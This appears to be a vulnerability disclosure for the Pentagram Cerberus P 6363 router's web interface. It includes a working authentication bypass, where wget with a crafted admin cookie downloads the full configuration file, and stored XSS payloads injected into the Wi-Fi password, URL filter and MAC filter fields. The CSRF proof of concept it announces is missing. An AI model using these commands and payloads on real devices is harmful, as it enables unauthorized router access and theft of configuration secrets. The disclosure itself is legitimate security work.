 
Cerberus P 6363 is simple SOHO class router. Its producer claims that it may act
as a 4 port switch and has an advanced firewall (...)
 
Device management is only possible through WWW GUI and because of that, GUI was 
targeted and is subject of this raport.
 
 
2. Authentication Bypass (CWE-592)
 
This bug is really trivial. All we need to do is set up "special" cookie before 
accessing GUI:
 
condis@pandorum:~$ wget http://192.168.1.100/cgi-bin/DownloadCfg/RouterCfm.cfg -t 1 -nv -O pento.cfg
2013-12-11 23:06:46 URL:http://192.168.1.100/login.asp [3663] -> "pento.cfg" [1]
condis@pandorum:~$ head -n 5 pento.cfg 
<html>
<head>
<META http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<title>PENTAGRAM Cerberus P 6363</title>
<script type="text/javascript" src="lang/b28n.js"></script>
 
and now lets try some voodoo magic :x 
 
condis@pandorum:~$ wget http://192.168.1.100/cgi-bin/DownloadCfg/RouterCfm.cfg -t 1 -nv -O pento.cfg --header="Cookie: admin:language=en"
condis@pandorum:~$ head -n 5 pento.cfg 
#Please don&#039;t change this file by hand
dhcp_static_lease3=
sb/1/ofdm2gpo=0x66442200
wl_radius_port=1812
wl0.1_radius_port=1812
 
 
3. Multiple Cross Site Scripting (CWE-79)
 
GUI has some simple function that filters out non-alphanumeric characters but it 
is written in JavaScript, and as we all know, implementing protection only on 
client-side is no protection at all.
 
One of attack methods would be to turn off JavaScript or write some simple scripts 
 
it manually changing relevant variables/directives and then reupload it back to 
the device.
 
 
3.1 Setting WI-FI Password 
 
wl_wpa_psk=wifi_password";alert(&#039;XSS&#039;);//
 
This code will be executed on index page.
 
 
3.2 Setting URL Filtration
 
filter_url0=192.168.1.12-192.168.1.13:bar,0-6,0-0,on,foo");alert(&#039;XSS&#039;);//
 
If "filter_url_mode" is disabled, we must change it to "deny" or "pass". Code 
injected here will be executed in Security Settings -> URL Filter Setting page.
 
 
3.3 Setting MAC Address Filtration
 
filter_mac0=DE:AD:DE:AD:DE:AD,0-6,0-0,on,gangbang&#039;);alert(&#039;xss&#039;);//
 
If "filter_mac_mode" variable is disabled, we must change it to "deny" or "pass". 
Code injected here will be executed in Security Settings -> MAC Address Filter 
Settings.
 
Probably there are more XSS flaws, but I stopped searching after those three...
 
 
4. Cross Site Request Forgery (CWE-352)
 
any operation on the logged administrator. Below there is simple proof of concept
which enables httpd to WAN (access from IP = 69.69.69.69) :

5. Epilogue
 
I tried to estalish a dialogue with vendor (07.12.2013) but they didn&#039;t respond 
for five days (probably they don&#039;t give a fuck about security) so I decided to 
publish all bugs.
 
Also, what&#039;s obvious there is no patch so best solution that I can think of now
is to stop using P 6363 and try other version. (P 6362 has different firmware
and at first glance it looked better).
